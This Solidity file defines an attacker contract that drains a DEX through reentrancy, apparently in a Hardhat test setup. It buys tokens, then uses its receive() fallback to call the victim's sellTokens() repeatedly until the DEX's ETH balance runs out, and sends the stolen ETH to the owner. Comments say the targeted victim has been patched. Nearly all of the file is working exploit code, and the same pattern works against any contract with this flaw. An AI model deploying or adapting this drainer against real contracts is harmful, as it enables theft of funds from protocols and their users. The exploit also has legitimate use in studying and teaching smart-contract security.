// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "hardhat/console.sol";

// Discountinued, victim contract has been patched!

interface iEtbDex {
  function buyTokens() external payable;
  function sellTokens(uint256 _amount) external;
}

interface iEtbToken {
  function balanceOf(address account) external view returns (uint256);
}

contract AttackDEXContract {
  iEtbDex private dexContract;
  iEtbToken private tokenContract;
  address public owner;
  uint sellTokensAmount;

  constructor(address _dexContractAddress, address _tokenContractAddress) {
    dexContract = iEtbDex(_dexContractAddress);
    tokenContract = iEtbToken(_tokenContractAddress);
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "Not authorized");
    _;
  }

  receive() external payable {
    // Reentrant the DEX Contract as long as it has enough ETHs on its balance && the attacker contract's token balance is enough to reenter the sellTokens() function
    if ((address(dexContract).balance >= sellTokensAmount) && (tokenContract.balanceOf(address(this)) > sellTokensAmount)) {
      console.log("");
      console.log("From Attacker contract: Reentring the Victim Contract");
      console.log("DEX Contract ETH Balance: ", address(dexContract).balance);
      console.log("Attacker contract Tokens Balance", tokenContract.balanceOf(address(this)));

      dexContract.sellTokens(sellTokensAmount);
    } else {
      console.log("");
      console.log("Attacker contract can't continue reentering the Victim contract, thus, sending all the ETH that was collected");
      
      // When the victim contract has no more ETHs, the attack is completed, and all the ETH that was taken during the attack will be sent to the attacker's account! 
      (bool success, ) = payable(owner).call{value: address(this).balance }("");
      require(success, "Error when sending the ETH from the Attacker contract to the attacker's account");
    }
    
  }

  function buyTokens() external payable onlyOwner() {
    // Buy tokens on the dex contract
    dexContract.buyTokens{ value : msg.value }();
    // Commented the below line because when the fees were activated on the dex contract, it gets more tricky to calculate the exact tokens that were received
    //require(tokenContract.balanceOf(address(this)) == msg.value, "Error while buying the tokens using the DEX Contract");
  }
  
  // Victim contract has been patched and the sellTokens() can't be reentered anymore!
  function sellTokens(uint256 _amount) external onlyOwner() {
    require(tokenContract.balanceOf(address(this)) > 0, "Error, attacker contract has not tokens");
    sellTokensAmount = _amount;
    dexContract.sellTokens(sellTokensAmount);
  }
  
}